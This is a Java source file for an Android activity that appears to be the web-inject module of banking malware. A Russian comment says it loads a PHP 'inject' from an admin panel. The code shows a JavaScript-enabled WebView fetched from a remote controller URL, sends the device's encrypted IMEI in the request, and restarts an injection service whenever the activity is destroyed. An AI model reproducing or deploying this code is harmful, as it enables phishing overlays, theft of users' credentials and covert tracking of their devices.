package com.example.livemusay.myapplication;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class injectionActivity extends Activity {
    secFunctions SF = new secFunctions();
    constants const_ = new constants();
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_inj);
    }
    @Override
    protected void onStart() {
        super.onStart();
        Intent intent = getIntent();
        String str = intent.getStringExtra("str");

        WebView webView = (WebView) findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());

        //загружаем с админки php инжект
        webView.loadUrl(const_.url+"/inj/" + str + ".php?p=" + SF.trafEnCr(SF.IMEI(this)));
    }

    @Override
    protected void onStop() {
        super.onStop();

        finish();
    }

    @Override
    protected void onPause() {
        super.onStop();

        finish();
    }


    @Override
    public void onDestroy(){
        super.onDestroy();

        startService(new Intent(this, injectionService.class));
    }


}
